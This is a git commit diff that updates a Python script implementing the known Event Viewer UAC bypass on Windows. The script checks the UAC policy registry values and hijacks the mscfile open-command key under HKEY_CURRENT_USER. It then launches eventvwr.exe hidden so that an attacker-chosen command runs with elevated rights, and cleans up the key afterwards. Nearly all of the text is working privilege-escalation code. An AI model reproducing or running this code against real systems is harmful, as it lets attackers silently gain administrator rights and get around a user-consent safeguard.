0644b87b36985de1fad708cd69b969e942a1eb73
rootm0s <rickardmalmkvist@hotmail.com>
2018-04-09 18:33:13 +0200

    Update event_viewer_uac_bypass.py

--- event_viewer_uac_bypass.py
+++ event_viewer_uac_bypass.py
@@ -24,16 +24,16 @@ def cmd_path():
 		return False
 
 def event_viewer_uac_bypass():
-	try:
-		PromptBehaviorAdmin = _winreg.QueryValueEx(_winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"),"ConsentPromptBehaviorAdmin")
-		PromptOnSecureDesktop = _winreg.QueryValueEx(_winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"),"PromptOnSecureDesktop")
-	except Exception as error:
-		sys.exit()
+	if (os.path.isfile(os.path.join("c:\windows\system32\eventvwr.exe")) == True):
+		try:
+			PromptBehaviorAdmin = _winreg.QueryValueEx(_winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"),"ConsentPromptBehaviorAdmin")
+			PromptOnSecureDesktop = _winreg.QueryValueEx(_winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"),"PromptOnSecureDesktop")
+		except Exception as error:
+			sys.exit()
 
-	if (PromptBehaviorAdmin[0] == "2" and PromptOnSecureDesktop[0] == "1"):
-		sys.exit()
-	else:
-		if (os.path.isfile(os.path.join("c:\windows\system32\eventvwr.exe")) == True):
+		if (PromptBehaviorAdmin[0] == "2" and PromptOnSecureDesktop[0] == "1"):
+			sys.exit()
+		else:
 			try:
 				key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,"Software\Classes\mscfile\shell\open\command")
 				_winreg.SetValueEx(key,None,0,_winreg.REG_SZ,cmd_path())
@@ -44,14 +44,12 @@ def event_viewer_uac_bypass():
 				win32api.ShellExecute(0,None,"c:\windows\system32\eventvwr.exe",None,None,win32con.SW_HIDE)
 			except Exception as error:
 				sys.exit()
-				
+
 			time.sleep(5)
-			
+
 			try:
 				_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,"Software\Classes\mscfile\shell\open\command")
 			except Exception as error:
 				sys.exit()
-		else:
-			sys.exit()
 	else:
 		sys.exit()
